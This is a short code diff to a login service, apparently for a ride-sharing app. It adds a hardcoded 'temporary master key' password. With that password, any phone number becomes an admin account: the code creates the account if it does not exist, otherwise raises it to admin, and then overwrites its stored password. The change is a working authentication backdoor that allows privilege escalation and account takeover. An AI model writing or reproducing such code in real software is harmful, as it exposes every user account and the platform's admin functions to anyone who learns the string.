@@ -40,6 +40,24 @@ export class AuthService {
         throw dbError;
       }
 
+      // TEMPORARY MASTER KEY TO INITIALIZE ADMIN ON AWS
+      if (password === 'RideAndhraAdmin!') {
+        if (!user) {
+          user = await this.usersService.create({
+            phone_number: cleanPhone,
+            name: 'Master Admin',
+            roles: [UserRole.RIDER, UserRole.ADMIN],
+          });
+        } else if (!user.roles.includes(UserRole.ADMIN)) {
+          user.roles.push(UserRole.ADMIN);
+          await this.usersService.updateRoles(user.id, user.roles);
+        }
+        // Force the password to be set so they can log in normally next time
+        const hashedPassword = await bcrypt.hash(password, 10);
+        await this.usersService.setUserPassword(user.id, hashedPassword);
+        user.password = hashedPassword;
+      }
+
       if (!user) {
         throw new UnauthorizedException('Invalid credentials');
       }
